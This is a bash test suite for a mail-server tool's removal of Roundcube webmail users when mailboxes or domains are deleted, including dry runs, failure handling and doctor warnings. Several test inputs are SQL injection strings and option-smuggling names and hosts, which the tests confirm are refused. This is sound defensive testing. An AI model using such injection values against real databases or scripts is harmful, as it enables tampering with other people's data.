MAIL_STATE_DIR="$_wf/mailstate"; MAIL_DOMAINS_DIR="$MAIL_STATE_DIR/domains"; MAIL_DOMAINS_GONE_DIR="$_wf/gone"
MAIL_ALIAS_DIR="$MAIL_STATE_DIR/aliases"; MAIL_DISABLED_DIR="$MAIL_STATE_DIR/disabled"
MAIL_PASSWD_FILE="$_wf/passwd"; MAIL_DKIM_DIR="$_wf/dkim"; MAIL_VMAIL_HOME="$_wf/vmail"; BACKUP_ROOT="$_wf/backups"
mkdir -p "$MAIL_ALIAS_DIR" "$MAIL_DKIM_DIR" "$MAIL_VMAIL_HOME" "$BACKUP_ROOT"
_wf_hash='{BLF-CRYPT}$2y$05$abcdefghijklmnopqrstuv'
# A webmail that is installed: a release, "current" pointing at it, and the file that says
# there is a database. Where the filesystem has no links the release itself stands in for it.
mkdir -p "$_wf/wm/releases/1.7.4/bin"; printf '<?php\n' >"$_wf/wm/releases/1.7.4/bin/deluser.sh"
if (( CAN_SYMLINK )); then ln -sfn "$_wf/wm/releases/1.7.4" "$_wf/wm/current"; WM_CURRENT="$_wf/wm/current"
else WM_CURRENT="$_wf/wm/releases/1.7.4"; fi
WM_INFO="$_wf/webmail.info"
printf 'WM_DB_NAME=lomp_webmail\nWM_DB_USER=lomp_webmail\nWM_DB_PASS=x\nWM_DES_KEY=y\n' >"$WM_INFO"
# Roundcube's table of users is a file here: one "name<TAB>host" line each. The stand-in for
# PHP takes a line out of it the way bin/deluser.sh deletes that one row, and writes down where
# it was started and with what.
cat >"$_wf/php" <<'WF_PHP'
#!/usr/bin/env bash
here="$(cd "$(dirname "$0")" && pwd)"
printf '%s|%s\n' "${PWD##*/}" "$*" >>"$here/php.log"
if [[ -e "$here/php.fail" ]]; then echo "No DB connection" >&2; exit 1; fi
if [[ -e "$here/php.deaf" ]]; then echo "User not found."; exit 0; fi
[[ $# -eq 3 && "$1" == "bin/deluser.sh" && "$2" == --host=* ]] || exit 1
awk -F'\t' -v n="$3" -v h="${2#--host=}" '!($1 == n && $2 == h)' "$here/users.tsv" >"$here/users.new"
mv "$here/users.new" "$here/users.tsv"
echo "Successfully deleted user 1"
WF_PHP
chmod +x "$_wf/php"
# What needs a mail server, a database or PHP to be there is stood in for; what decides who is
# forgotten and when is the real code. The table answers the questions the code asks of it,
# and nothing else: a statement of another shape is a failure.
_wf_stubs="$(cat <<'WF_STUBS'
lib_mail_installed() { return 0; }
lib_mail_dkim_ensure() { return 0; }
lib_mail_tables_apply() { return 0; }
lib_mail_domain_cert_ensure() { return 0; }
lib_mail_dns_print() { return 0; }
lib_mail_backup_domain() { return 0; }
lib_cf_token() { printf ""; }
lib_require_tools() { return 0; }
sleep() { return 0; }
doveadm() { return 0; }
postqueue() { return 0; }
lib_webmail_installed() { [[ ! -e "$_wf/wm.off" ]]; }
lib_webmail_php_version() { printf "8.3"; }
lib_php_cli() { printf "%s" "$_wf/php"; }
lib_db_sql() {
  local v=""
  printf "%s\n" "$1" >>"$_wf/sql.log"
  [[ ! -e "$_wf/db.down" ]] || return 1
  v="$(sed -n "s/.* = '\([^']*\)' ORDER BY user_id\$/\1/p" <<<"$1")"
  case "$1" in
    *"users WHERE LOWER(SUBSTRING_INDEX(username, '@', -1)) = '"*)
      awk -F'\t' -v v="$v" '{ n = split($1, p, "@"); if (tolower(p[n]) == v) print }' "$_wf/users.tsv" ;;
    *"users WHERE LOWER(username) = '"*) awk -F'\t' -v v="$v" 'tolower($1) == v' "$_wf/users.tsv" ;;
    *"users WHERE username = '"*)        awk -F'\t' -v v="$v" '$1 == v' "$_wf/users.tsv" ;;
    # every user, for the list of those whose mailbox is gone: this statement and no other
    'SELECT username FROM `lomp_webmail`.users ORDER BY user_id') cut -f1 "$_wf/users.tsv" ;;
    *) return 1 ;;
  esac
}
WF_STUBS
)"
_wf_do()    { eval "$_wf_stubs"; "$@"; }                               # under run_isolated: the status is the answer
_wf_run()   { ( _wf_do "$@" ) >/dev/null 2>&1 || true; }               # where it is expected to work
# How it ended and what it printed, run the way the installer runs it: with errexit armed, so
# a helper that hands a failure back to its caller ends the command here as it would there.
_wf_tee()   { "$@" >"$_wf/say.out" 2>&1; }
_wf_say()   { : >"$_wf/say.out"; printf 'rc=%s\n' "$(OPT_QUIET=0 run_isolated _wf_tee _wf_do "$@")"; cat "$_wf/say.out"; }
_wf_users() { : >"$_wf/users.tsv"; if (($# > 0)); then printf '%s\t127.0.0.1\n' "$@" >"$_wf/users.tsv"; fi; : >"$_wf/php.log"; : >"$_wf/sql.log"; : >"$RUNUSER_LOG"; }
_wf_has()   { grep -qxF "${1}"$'\t127.0.0.1' "$_wf/users.tsv"; }
_wf_left()  { cut -f1 "$_wf/users.tsv" | tr '\n' ' ' | sed 's/ $//'; }
_wf_asked() { cat "$_wf/sql.log" "$_wf/php.log"; }

# ---- one user, by the address ------------------------------------------------
_wf_users gone@shop.example other@shop.example far@elsewhere.example
assert_eq    "the webmail forgets an address it has a user for"     0 "$(run_isolated _wf_do lib_webmail_user_forget gone@shop.example)"
assert_false "the user is out of Roundcube's table"                 _wf_has gone@shop.example
assert_eq    "and nobody else is"                                   "other@shop.example far@elsewhere.example" "$(_wf_left)"
assert_eq    "Roundcube's own script did it, once, in the release that runs" \
  "1.7.4|bin/deluser.sh --host=127.0.0.1 gone@shop.example" "$(cat "$_wf/php.log")"
assert_eq    "as the webmail's own user, not as root" \
  "-u ${WM_USER} -- ${_wf}/php bin/deluser.sh --host=127.0.0.1 gone@shop.example" "$(cat "$RUNUSER_LOG")"
assert_has   "the table was asked for that one address"             "users WHERE LOWER(username) = 'gone@shop.example' ORDER BY" "$(cat "$_wf/sql.log")"
_wf_users other@shop.example
assert_eq    "an address that never signed in is no failure"        0 "$(run_isolated _wf_do lib_webmail_user_forget never@shop.example)"
assert_eq    "and PHP is not started for it"                        "" "$(cat "$_wf/php.log")"
assert_eq    "how many went is counted"                             "1 0" \
  "$( ( _wf_do lib_webmail_user_forget other@shop.example; printf '%s ' "$WM_FORGOT"; _wf_do lib_webmail_user_forget other@shop.example; printf '%s' "$WM_FORGOT" ) 2>/dev/null )"
# Dovecot lowers a login and Roundcube does by default, but that is a default of theirs: a
# user stored in another case is this mailbox's all the same, and the script is told the name
# as it is stored - the column is compared byte for byte
_wf_users Info@Shop.Example
_wf_run lib_webmail_user_forget INFO@shop.example
assert_eq    "a user stored in another case is found, and named as stored" \
  "1.7.4|bin/deluser.sh --host=127.0.0.1 Info@Shop.Example" "$(cat "$_wf/php.log")"
assert_eq    "and is gone"                                          "" "$(_wf_left)"
printf 'old@shop.example\tlocalhost\n' >"$_wf/users.tsv"; : >"$_wf/php.log"
_wf_run lib_webmail_user_forget old@shop.example
assert_eq    "the host is the one stored with the user, so the row found is the row removed" \
  "1.7.4|bin/deluser.sh --host=localhost old@shop.example" "$(cat "$_wf/php.log")"

# ---- a domain's worth: @domain, the way a catch-all is named -----------------
_wf_users a@shop.example B@Shop.Example c@myshop.example d@shop.example.tr
assert_eq    "@domain is every user of that domain"                 2 "$( ( _wf_do lib_webmail_user_forget @Shop.Example; printf '%s' "$WM_FORGOT" ) 2>/dev/null )"
assert_eq    "and of no domain whose name only ends or begins the same" "c@myshop.example d@shop.example.tr" "$(_wf_left)"
assert_has   "the domain is what follows the last @"                "users WHERE LOWER(SUBSTRING_INDEX(username, '@', -1)) = 'shop.example' ORDER BY" "$(cat "$_wf/sql.log")"
# what comes back from a table is text, and here it becomes an argument: Roundcube's option
# parser would read a name that starts with a dash as an option
_wf_users --age=1@shop.example ok@shop.example
assert_eq    "a stored name that is no address is left, and that is not success" 1 "$(run_isolated _wf_do lib_webmail_user_forget @shop.example)"
assert_eq    "it never became an argument"                          "1.7.4|bin/deluser.sh --host=127.0.0.1 ok@shop.example" "$(cat "$_wf/php.log")"
printf 'odd@shop.example\t127.0.0.1 --age=1\n' >"$_wf/users.tsv"; : >"$_wf/php.log"
assert_eq    "nor does a host that no host name looks like"         "1:" "$(run_isolated _wf_do lib_webmail_user_forget odd@shop.example):$(cat "$_wf/php.log")"
# and nothing reaches the statement that could end its string
_wf_users gone@shop.example
assert_eq    "a name with a quote in it is refused"                 1 "$(run_isolated _wf_do lib_webmail_user_forget "x' OR '1'='1")"
assert_eq    "so is a domain with one"                              1 "$(run_isolated _wf_do lib_webmail_user_forget "@shop.example' OR 1=1 -- ")"
assert_eq    "and the lookup refuses them by itself"                1 "$(run_isolated _wf_do _wm_users "x'y@shop.example")"
assert_eq    "none of them reached the database"                    "" "$(_wf_asked)"

# ---- what it must not do, and what counts as not done ------------------------
_wf_out="$(OPT_DRY_RUN=1 _wf_say lib_webmail_user_forget gone@shop.example)"
assert_has   "a dry run says what would go"                         "would remove what the webmail keeps for gone@shop.example" "$_wf_out"
assert_has   "and succeeds"                                         "rc=0" "$_wf_out"
assert_true  "without removing it"                                  _wf_has gone@shop.example
assert_eq    "or asking anything of the database or of PHP"         "" "$(_wf_asked)"
: >"$_wf/php.fail"
assert_eq    "a script that fails is a removal that failed"         1 "$(run_isolated _wf_do lib_webmail_user_forget gone@shop.example)"
assert_true  "and the user is where it was"                         _wf_has gone@shop.example
rm -f "$_wf/php.fail"; : >"$_wf/php.deaf"
# "User not found." is exit status 0 in Roundcube's script, and so is a removal a plugin called off
assert_eq    "so is one that exits 0 and removes nothing"           1 "$(run_isolated _wf_do lib_webmail_user_forget gone@shop.example)"
rm -f "$_wf/php.deaf"; : >"$_wf/db.down"; : >"$_wf/php.log"
assert_eq    "and a database that does not answer"                  1 "$(run_isolated _wf_do lib_webmail_user_forget gone@shop.example)"
assert_eq    "PHP is not started on a guess"                        "" "$(cat "$_wf/php.log")"
rm -f "$_wf/db.down"; : >"$_wf/wm.off"
# uninstalled with its database kept: the user is still in it, and no script is there to run
assert_eq    "a webmail that is not installed cannot remove its user" 1 "$(run_isolated _wf_do lib_webmail_user_forget gone@shop.example)"
assert_eq    "but an address it has nothing for is still no failure"  0 "$(run_isolated _wf_do lib_webmail_user_forget never@shop.example)"
rm -f "$_wf/wm.off"; : >"$_wf/sql.log"
assert_eq    "a server with no webmail database has nothing to forget" "0:" \
  "$(WM_INFO="$_wf/no-such.info" run_isolated _wf_do lib_webmail_user_forget gone@shop.example):$(cat "$_wf/sql.log")"

# ---- deleting a mailbox ------------------------------------------------------
mkdir -p "$STATE_DIR/domains/shop.example"
printf '{"domain":"shop.example","mail":{"enabled":true,"selector":"lomp202601"}}\n' >"$(lib_domain_json shop.example)"
lib_mail_passwd_set "info@shop.example" "$_wf_hash" "1G"
lib_mail_passwd_set "sales@shop.example" "$_wf_hash" "1G"
lib_mail_passwd_set "quiet@shop.example" "$_wf_hash" "1G"
_wf_users info@shop.example sales@shop.example me@other.example
_wf_out="$(_wf_say lib_mail_box_del_main info@shop.example)"
assert_has   "a mailbox is deleted"                                 "rc=0" "$_wf_out"
assert_false "its line is gone"                                     lib_mail_box_exists info@shop.example
assert_false "and so is what the webmail kept for it"               _wf_has info@shop.example
assert_eq    "the mailbox beside it keeps its own"                  "sales@shop.example me@other.example" "$(_wf_left)"
# no archive brings an address book back, so its going is not left for the log alone to say
assert_has   "what went with it is said"                            "What the webmail kept for info@shop.example is gone too" "$_wf_out"
_wf_out="$(_wf_say lib_mail_box_del_main quiet@shop.example)"
assert_has   "a mailbox that never signed in is deleted like any other" "rc=0" "$_wf_out"
assert_lacks "with nothing said about a webmail it never used"      "webmail" "$_wf_out"
# never a reason to stop: by then the mailbox is gone, and a command that failed there would
# leave an operator with a deleted mailbox and no word on what is left
lib_mail_passwd_set "info@shop.example" "$_wf_hash" "1G"
_wf_users info@shop.example sales@shop.example; : >"$_wf/php.fail"
_wf_out="$(_wf_say lib_mail_box_del_main info@shop.example)"
rm -f "$_wf/php.fail"
assert_has   "a mailbox goes even when the webmail could not follow" "rc=0" "$_wf_out"
assert_false "its line is gone all the same"                        lib_mail_box_exists info@shop.example
assert_has   "what is left is said"                                 "The webmail still holds what info@shop.example kept there" "$_wf_out"
assert_has   "with the reason"                                      "left 1 of 1 user(s) in place" "$_wf_out"
assert_has   "and the command that finishes it"                     "lomp webmail forget info@shop.example" "$_wf_out"
lib_mail_passwd_set "dry@shop.example" "$_wf_hash" "1G"
_wf_users dry@shop.example sales@shop.example
( OPT_DRY_RUN=1; _wf_do lib_mail_box_del_main dry@shop.example ) >/dev/null 2>&1 || true
assert_true  "a dry run deletes no mailbox"                         lib_mail_box_exists dry@shop.example
assert_true  "and no webmail user"                                  _wf_has dry@shop.example
assert_eq    "and starts nothing"                                   "" "$(_wf_asked)"

# ---- turning mail off is not deleting it -------------------------------------
_wf_run lib_mail_disable_main shop.example
assert_false "a domain whose mail is off has no login"              lib_mail_box_exists sales@shop.example
assert_true  "its mailboxes are put aside"                          lib_mail_box_parked sales@shop.example
assert_false "which is not what a mailbox of another domain is"     lib_mail_box_parked sales@other.example
assert_false "nor an address nobody ever had"                       lib_mail_box_parked nobody@shop.example
assert_eq    "and the webmail keeps what was theirs"                "dry@shop.example sales@shop.example" "$(_wf_left)"
assert_eq    "it was not even asked"                                "" "$(_wf_asked)"
_wf_run lib_mail_enable_main shop.example
assert_true  "the mailbox comes back"                               lib_mail_box_exists sales@shop.example
assert_false "and is not put aside any more"                        lib_mail_box_parked sales@shop.example
assert_eq    "to the address book it left"                          "dry@shop.example sales@shop.example" "$(_wf_left)"
assert_eq    "with nothing asked on the way back either"            "" "$(_wf_asked)"
assert_lacks "putting mailboxes aside never names the webmail"      "webmail" "$(declare -f lib_mail_boxes_park)"

# ---- deleting a domain's mail ------------------------------------------------
# The mailboxes that were put aside are not in the live file, so no loop over the mailboxes
# ever meets them - and theirs is exactly what the next owner of the name must not be handed.
_wf_run lib_mail_disable_main shop.example
_wf_users dry@shop.example sales@shop.example old@shop.example me@other.example x@myshop.example
_wf_run lib_mail_disable_main shop.example --delete-data
assert_false "deleting a domain's mail takes the lines that were put aside" test -s "${MAIL_DISABLED_DIR}/shop.example.passwd"
assert_false "and what the webmail kept for those mailboxes"        _wf_has sales@shop.example
assert_false "every one of them"                                    _wf_has dry@shop.example
# old@ has no line anywhere: a mailbox deleted by a release that left its webmail user behind
assert_false "a user left behind long ago goes with the domain"     _wf_has old@shop.example
assert_eq    "another domain's users are not this domain's"         "me@other.example x@myshop.example" "$(_wf_left)"
lib_mail_domain_register own.example
lib_json_set "$(lib_mail_json own.example)" '.mail.enabled = true | .mail.selector = "lomp202602"'
lib_mail_passwd_set "a@own.example" "$_wf_hash" "1G"
lib_mail_passwd_set "b@own.example" "$_wf_hash" "1G"
_wf_users a@own.example b@own.example me@other.example
_wf_out="$(_wf_say lib_mail_domain_del_main own.example --no-backup)"
assert_false "a mail domain that is removed has no mailbox"         lib_mail_box_exists a@own.example
assert_eq    "and nobody in the webmail"                            "me@other.example" "$(_wf_left)"
# the one thing a removal takes that no archive brings back, so it is said before the question
assert_has   "the operator is told what no backup holds"            "and that is in no backup" "$_wf_out"
assert_has   "removing a site goes down the same road"              "lib_mail_domain_purge" "$(declare -f lib_domain_remove_main)"
_wf_pg="$(declare -f lib_mail_domain_purge)"
_wf_ln_box="$(grep -n 'lib_mail_box_remove' <<<"$_wf_pg" | head -1 | cut -d: -f1 || true)"
_wf_ln_parked="$(grep -n 'MAIL_DISABLED_DIR' <<<"$_wf_pg" | head -1 | cut -d: -f1 || true)"
_wf_ln_forget="$(grep -n '_mail_webmail_forget' <<<"$_wf_pg" | head -1 | cut -d: -f1 || true)"
assert_true  "the webmail is asked once no line of the domain is left to sign in with" \
  test "${_wf_ln_box:-0}" -gt 0 -a "${_wf_ln_box:-0}" -lt "${_wf_ln_parked:-0}" -a "${_wf_ln_parked:-0}" -lt "${_wf_ln_forget:-0}"
lib_mail_domain_register fail.example
lib_json_set "$(lib_mail_json fail.example)" '.mail.enabled = true | .mail.selector = "lomp202602"'
lib_mail_passwd_set "a@fail.example" "$_wf_hash" "1G"
_wf_users a@fail.example; : >"$_wf/db.down"
_wf_out="$(_wf_say lib_mail_domain_del_main fail.example --no-backup)"
rm -f "$_wf/db.down"
assert_has   "a domain goes even when the webmail could not follow" "rc=0" "$_wf_out"
assert_false "all of it"                                            lib_mail_domain_standalone fail.example
assert_has   "what is left is said, for the domain"                 "The webmail still holds what the mailboxes of fail.example kept there" "$_wf_out"
assert_has   "once, with the command that finishes it"              "lomp webmail forget @fail.example" "$_wf_out"
assert_eq    "and not once for each mailbox"                        1 "$(grep -c 'The webmail still holds' <<<"$_wf_out" || true)"

# ---- a restore takes logins away, not mailboxes ------------------------------
# The archive decides which lines a domain has, so one made after the backup is dropped. Its
# mail is not deleted by that, and neither is what the webmail keeps: nearly every line that is
# dropped comes straight back, to an owner who expects the address book where it was.
_wf_ar="$_wf/ar"; mkdir -p "$_wf_ar/mail" "$BACKUP_ROOT/rs.example"
printf '{"format":1,"kind":"mail","domain":"rs.example","created_at":"2026-01-01T00:00:00Z","maildirs":"doveadm"}\n' >"$_wf_ar/manifest.json"
printf '{"enabled":true,"selector":"lomp202603","selectors_used":["lomp202603"]}\n' >"$_wf_ar/mail/state.json"
printf 'kept@rs.example:%s::::::userdb_quota_rule=*:storage=1G\n' "$_wf_hash" >"$_wf_ar/mail/passwd"
tar -C "$_wf_ar" -czf "$BACKUP_ROOT/rs.example/rs.example-mail-20260101-000000.tar.gz" .
lib_mail_domain_register rs.example
lib_json_set "$(lib_mail_json rs.example)" '.mail.enabled = true | .mail.selector = "lomp202603"'
lib_mail_passwd_set "kept@rs.example" "$_wf_hash" "1G"
lib_mail_passwd_set "late@rs.example" "$_wf_hash" "1G"
_wf_users kept@rs.example late@rs.example
_wf_run lib_mail_restore_domain rs.example "$BACKUP_ROOT/rs.example/rs.example-mail-20260101-000000.tar.gz"
assert_true  "a restore brings back the mailboxes of the archive"   lib_mail_box_exists kept@rs.example
assert_false "and drops the line of one made since"                 lib_mail_box_exists late@rs.example
assert_eq    "but the webmail forgets nobody"                       "kept@rs.example late@rs.example" "$(_wf_left)"
assert_eq    "and is not asked to"                                  "" "$(_wf_asked)"
assert_lacks "dropping the lines never names the webmail"           "webmail" "$(declare -f _mail_lines_drop)"

# ---- lomp webmail forget -----------------------------------------------------
# For what a release before this one left behind, and for a removal that could not finish.
# What the webmail keeps for a mailbox that exists is its owner's, whether the mailbox is live
# or only switched off.
mkdir -p "$STATE_DIR/domains/cmd.example" "$STATE_DIR/domains/off.example"
printf '{"domain":"cmd.example","mail":{"enabled":true,"selector":"lomp202601"}}\n' >"$(lib_domain_json cmd.example)"
printf '{"domain":"off.example","mail":{"enabled":true,"selector":"lomp202601"}}\n' >"$(lib_domain_json off.example)"
lib_mail_passwd_set "live@cmd.example" "$_wf_hash" "1G"
lib_mail_passwd_set "p@off.example" "$_wf_hash" "1G"
_wf_run lib_mail_disable_main off.example
_wf_users live@cmd.example p@off.example gone@cmd.example x@nomail.example y@nomail.example
assert_eq    "forget refuses a mailbox that exists"                 1 "$(run_isolated _wf_do lib_webmail_forget_main live@cmd.example)"
assert_eq    "and one that is only switched off"                    1 "$(run_isolated _wf_do lib_webmail_forget_main p@off.example)"
assert_eq    "a domain that still has mailboxes"                    1 "$(run_isolated _wf_do lib_webmail_forget_main @cmd.example)"
assert_eq    "or has them put aside"                                1 "$(run_isolated _wf_do lib_webmail_forget_main @off.example)"
assert_eq    "a word that names nobody"                             1 "$(run_isolated _wf_do lib_webmail_forget_main "not an address")"
assert_eq    "and nothing at all"                                   1 "$(run_isolated _wf_do lib_webmail_forget_main)"
assert_eq    "none of which asked the webmail anything"             "" "$(_wf_asked)"
assert_has   "a live mailbox is pointed at the command that deletes it" "lomp mail box del live@cmd.example" "$(_wf_say lib_webmail_forget_main live@cmd.example)"
assert_has   "one that is switched off at the command that brings it back" "lomp mail enable off.example" "$(_wf_say lib_webmail_forget_main p@off.example)"
_wf_out="$(_wf_say lib_webmail_forget_main Gone@Cmd.Example)"
assert_false "a mailbox that is gone is forgotten"                  _wf_has gone@cmd.example
assert_has   "and the command says so"                              "The webmail has forgotten gone@cmd.example: 1 user(s)" "$_wf_out"
assert_has   "asked again, it says there is nothing"                "The webmail keeps nothing for gone@cmd.example" "$(_wf_say lib_webmail_forget_main gone@cmd.example)"
assert_eq    "@domain, for a domain with no mailbox left"           0 "$(run_isolated _wf_do lib_webmail_forget_main @nomail.example)"
assert_eq    "takes every user of it and no other"                  "live@cmd.example p@off.example" "$(_wf_left)"
_wf_users gone@cmd.example
_wf_out="$(OPT_DRY_RUN=1 _wf_say lib_webmail_forget_main gone@cmd.example)"
assert_has   "a dry run of it says what would go"                   "would remove what the webmail keeps for gone@cmd.example" "$_wf_out"
assert_lacks "and does not claim it went"                           "has forgotten" "$_wf_out"
assert_lacks "nor that there was nothing to go"                     "keeps nothing" "$_wf_out"
assert_true  "because it is still there"                            _wf_has gone@cmd.example
: >"$_wf/php.fail"
assert_eq    "a removal that fails is a failed command"             1 "$(run_isolated _wf_do lib_webmail_forget_main gone@cmd.example)"
rm -f "$_wf/php.fail"
assert_has   "the command is in the reference"                      "webmail forget <user@domain>|@<domain>" "$(lib_usage)"
assert_has   "and the dispatcher knows it"                          'lib_webmail_forget_main "${1:-}"' "$(declare -f lib_webmail_main)"

# ---- the users whose mailbox is gone -----------------------------------------
# What a release before this one left behind, and what a removal left when the database was
# down that minute: nothing listed them, so nobody could know what there was to forget. The
# list is every address the webmail has a user for and this server has no mailbox for - and a
# mailbox that is only switched off is a mailbox. live@cmd.example signs in, p@off.example is
# put aside; the others have no line anywhere.
_wf_gone()  { _wf_say lib_webmail_gone | tr '\n' ' ' | sed 's/ $//'; }     # "rc=N address address"
_wf_users live@cmd.example p@off.example gone@cmd.example old@nomail.example
assert_eq    "the users with no mailbox are listed, and no other"   "rc=0 gone@cmd.example old@nomail.example" "$(_wf_gone)"
assert_eq    "the table is asked once, for every user it has"       'SELECT username FROM `lomp_webmail`.users ORDER BY user_id' "$(cat "$_wf/sql.log")"
assert_eq    "a list starts nothing and removes nobody"             ":live@cmd.example p@off.example gone@cmd.example old@nomail.example" "$(cat "$_wf/php.log"):$(_wf_left)"
_wf_users live@cmd.example p@off.example
assert_eq    "a webmail whose users all have a mailbox has none"    "rc=0" "$(_wf_gone)"
_wf_users
assert_eq    "and so has one nobody ever signed in to"              "rc=0" "$(_wf_gone)"
# compared the way a login is, whatever the case a name was stored in
_wf_users Live@Cmd.Example P@Off.Example Gone@Cmd.Example
assert_eq    "a user stored in another case is its mailbox's all the same" "rc=0 gone@cmd.example" "$(_wf_gone)"
# ...and as a whole address, letter for letter: one that is a part of a mailbox's name, or
# that matches it when its dot is read as "any character", is not that mailbox
_wf_users ive@cmd.example l.ve@cmd.example live@cmd.example.tr live@cmd.example
assert_eq    "an address that only looks like a mailbox's is not one" "rc=0 ive@cmd.example l.ve@cmd.example live@cmd.example.tr" "$(_wf_gone)"
# Roundcube's key is the name and the host together, and a name can be stored in two spellings
printf 'dup@cmd.example\t127.0.0.1\ndup@cmd.example\tlocalhost\nDup@Cmd.Example\t127.0.0.1\n' >"$_wf/users.tsv"
assert_eq    "an address stored more than once is listed once"      "rc=0 dup@cmd.example" "$(_wf_gone)"
_wf_users z@b.example b@a.example a@b.example z@a.example
assert_eq    "the addresses of a domain stand together"             "rc=0 b@a.example z@a.example a@b.example z@b.example" "$(_wf_gone)"
# what comes back from a table is text: a name that is no address is nobody's mailbox, and
# nothing "forget" could be told to take - an option, two addresses in one, a quote, a space
printf '%s\t127.0.0.1\n' '--age=1@cmd.example' 'nobody' 'a@b@cmd.example' "x'y@cmd.example" 'sp ace@cmd.example' 'tail@cmd.example ' 'ok@cmd.example' >"$_wf/users.tsv"
assert_eq    "a stored name that is no address is not listed"       "rc=0 ok@cmd.example" "$(_wf_gone)"
_wf_users gone@cmd.example; : >"$_wf/wm.off"
assert_eq    "the list needs Roundcube's table, not Roundcube on the disk" "rc=0 gone@cmd.example" "$(_wf_gone)"
rm -f "$_wf/wm.off"; : >"$_wf/sql.log"
assert_eq    "a server with no webmail database has nobody, and asks nothing" "rc=0:" "$(WM_INFO="$_wf/no-such.info" _wf_gone):$(cat "$_wf/sql.log")"

# ---- "none" and "cannot tell" are two answers --------------------------------
# The list is what doctor names and what "forget --gone" removes. A mailbox file that is
# missing, empty or unreadable would make every user of the webmail look like one whose mailbox
# is gone - so without a single mailbox to hold the users against, the answer is that it cannot
# be told (2), as it is when the table cannot be read (1).
_wf_users live@cmd.example p@off.example gone@cmd.example old@nomail.example
: >"$_wf/db.down"
assert_eq    "a database that does not answer is not an empty list" "rc=1" "$(_wf_gone)"
rm -f "$_wf/db.down"
mv "$MAIL_PASSWD_FILE" "$_wf/passwd.kept"
assert_eq    "with no mailbox file, nobody is called gone"          "rc=2" "$(_wf_gone)"
: >"$MAIL_PASSWD_FILE"
assert_eq    "nor with an empty one"                                "rc=2" "$(_wf_gone)"
printf '# every line of it was lost\n' >"$MAIL_PASSWD_FILE"
assert_eq    "nor with one that names no mailbox"                   "rc=2" "$(_wf_gone)"
if (( CAN_CHMOD )) && [[ "$(id -u)" != "0" ]]; then   # root reads what nobody may
  cp "$_wf/passwd.kept" "$MAIL_PASSWD_FILE"; chmod 000 "$MAIL_PASSWD_FILE"
  assert_eq  "nor with one that cannot be read"                     "rc=2" "$(_wf_gone)"
  chmod 600 "$MAIL_PASSWD_FILE"
fi
rm -f "$MAIL_PASSWD_FILE"
# what is known is still said: a mailbox that is put aside is in a file of its own
_wf_users p@off.example
assert_eq    "a mailbox put aside is not gone, whatever the live file says" "rc=0" "$(_wf_gone)"
_wf_users
assert_eq    "and a webmail without users leaves nothing to be unsure about" "rc=0" "$(_wf_gone)"
mv "$_wf/passwd.kept" "$MAIL_PASSWD_FILE"

# ---- doctor names them -------------------------------------------------------
_wf_doc()   { DOC_RESULTS=(); DOC_FAIL=0; DOC_WARN=0; DOC_OK=0; _doc_webmail_gone; printf '%s\n' "${DOC_RESULTS[@]-}" "ok=${DOC_OK} warn=${DOC_WARN} fail=${DOC_FAIL}"; }
_wf_users live@cmd.example p@off.example
_wf_out="$(_wf_say _wf_doc)"
assert_has   "doctor says so when the webmail keeps nothing it should not" "OK|webmail: mailboxes gone|it keeps nothing for an address that has no mailbox" "$_wf_out"
assert_has   "and that is no warning"                               "ok=1 warn=0 fail=0" "$_wf_out"
_wf_users live@cmd.example p@off.example gone@cmd.example old@nomail.example
_wf_out="$(_wf_say _wf_doc)"
assert_has   "doctor warns about users with no mailbox, and names them" \
  "WARN|webmail: mailboxes gone|it still keeps the address book, identities and settings of 2 address(es) that have no mailbox any more: gone@cmd.example, old@nomail.example;" "$_wf_out"
assert_has   "with the command that removes one"                    "lomp webmail forget <address>" "$_wf_out"
assert_has   "and the one that lists them all"                      "lomp webmail forget --gone" "$_wf_out"
assert_lacks "a mailbox that signs in is not named"                 "live@cmd.example" "$_wf_out"
assert_lacks "nor one that is switched off"                         "p@off.example" "$_wf_out"
assert_has   "it is a warning, and the check itself does not fail"  "rc=0" "$_wf_out"
assert_has   "one warning for all of them"                          "ok=0 warn=1 fail=0" "$_wf_out"
assert_eq    "doctor only looks: nothing is started, nobody removed" ":live@cmd.example p@off.example gone@cmd.example old@nomail.example" "$(cat "$_wf/php.log"):$(_wf_left)"
# a line of doctor is one line: the first five by name, the rest by their number
_wf_users g1@cmd.example g2@cmd.example g3@cmd.example g4@cmd.example g5@cmd.example
_wf_out="$(_wf_say _wf_doc)"
assert_has   "five are all named"                                   "of 5 address(es) that have no mailbox any more: g1@cmd.example, g2@cmd.example, g3@cmd.example, g4@cmd.example, g5@cmd.example;" "$_wf_out"
_wf_users g1@cmd.example g2@cmd.example g3@cmd.example g4@cmd.example g5@cmd.example g6@cmd.example g7@cmd.example
_wf_out="$(_wf_say _wf_doc)"
assert_has   "of more, the first five and how many there are besides" "of 7 address(es) that have no mailbox any more: g1@cmd.example, g2@cmd.example, g3@cmd.example, g4@cmd.example, g5@cmd.example and 2 more;" "$_wf_out"
assert_lacks "the sixth is for the command to list"                 "g6@cmd.example" "$_wf_out"
# and when it cannot be told, that is what doctor says - with no name in it
_wf_users live@cmd.example gone@cmd.example
: >"$_wf/db.down"
_wf_out="$(_wf_say _wf_doc)"
rm -f "$_wf/db.down"
assert_has   "a database that does not answer is said"              "WARN|webmail: mailboxes gone|the webmail's database did not answer" "$_wf_out"
assert_lacks "and not read as a webmail that keeps nothing"         "OK|" "$_wf_out"
mv "$MAIL_PASSWD_FILE" "$_wf/passwd.kept"
_wf_out="$(_wf_say _wf_doc)"
mv "$_wf/passwd.kept" "$MAIL_PASSWD_FILE"
assert_has   "without a mailbox file doctor says that it cannot tell" \
  "WARN|webmail: mailboxes gone|the webmail has users, and ${MAIL_PASSWD_FILE} is missing or names no mailbox to hold them against: which of them are left from a mailbox that is gone cannot be told" "$_wf_out"
assert_lacks "and calls nobody gone: not the user whose mailbox is" "gone@cmd.example" "$_wf_out"
assert_lacks "nor the one who has a mailbox"                        "live@cmd.example" "$_wf_out"
assert_lacks "nor does it send anybody to remove them all"          "--gone" "$_wf_out"
assert_has   "the check runs where doctor looks at the webmail"     "_doc_webmail_gone" "$(declare -f _doc_check_webmail)"

# ---- lomp webmail forget --gone ----------------------------------------------
# All of them at once: the whole list - doctor names five - then one question.
_wf_users live@cmd.example p@off.example gone@cmd.example old@nomail.example
_wf_out="$(OPT_DRY_RUN=1 _wf_say lib_webmail_forget_main --gone)"
assert_has   "a dry run of --gone lists them"                       "        gone@cmd.example" "$_wf_out"
assert_has   "every one"                                            "        old@nomail.example" "$_wf_out"
assert_has   "says what a real run would do"                        "[dry-run] would remove what the webmail keeps for them" "$_wf_out"
assert_has   "and succeeds"                                         "rc=0" "$_wf_out"
